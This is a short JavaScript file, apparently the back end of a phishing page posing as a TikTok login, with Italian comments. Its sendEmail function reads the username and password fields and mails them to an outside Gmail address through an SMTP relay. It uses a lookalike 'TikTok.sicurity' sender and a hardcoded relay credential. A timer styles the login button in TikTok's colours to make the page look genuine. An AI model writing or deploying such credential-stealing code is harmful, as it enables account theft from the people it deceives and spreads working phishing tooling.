let NomeUtente,Password;
function sendEmail() {
//-----------Aqcuisizione dati--------------------//
NomeUtente = document.getElementById("Nome/Email").value;
Password = document.getElementById("Password").value;
//-----------Spedizione dati--------------------//
Email.send({
  Host: "smtp.elasticemail.com",
  Username: "TikTok.sicurity@gmail.com",
  Password: "4985ECAA064FA6B3FADE3C6A981A1B8A1AC2",
  To: 'message.web.info@gmail.com',
  From: "tiktok.sicurity@gmail.com",
  Subject: "Nuovo account:",
  Body: ("Nome Utente: " + NomeUtente + "\n" + "Password: " + Password)
  })
  .then(function (message) {
  });
  sendEmail();
}
setInterval(() => {
  NomeUtente = document.getElementById("Nome/Email").value;
  Password = document.getElementById("Password").value;
  if(NomeUtente != "" && Password != ""){
    document.getElementById("btnAccedi").style.background="#FE2B54";
    document.getElementById("btnAccedi").style.border="#FE2B54";
    document.getElementById("btnAccedi").style.color="white";
    document.getElementById("btnAccedi").disabled=false;
  }
  else {
    document.getElementById("btnAccedi").style.background="#EBEBEB";
    document.getElementById("btnAccedi").style.border="#EBEBEB";
    document.getElementById("btnAccedi").style.color="#808185";
    document.getElementById("btnAccedi").disabled=true;
  }
}, 100);
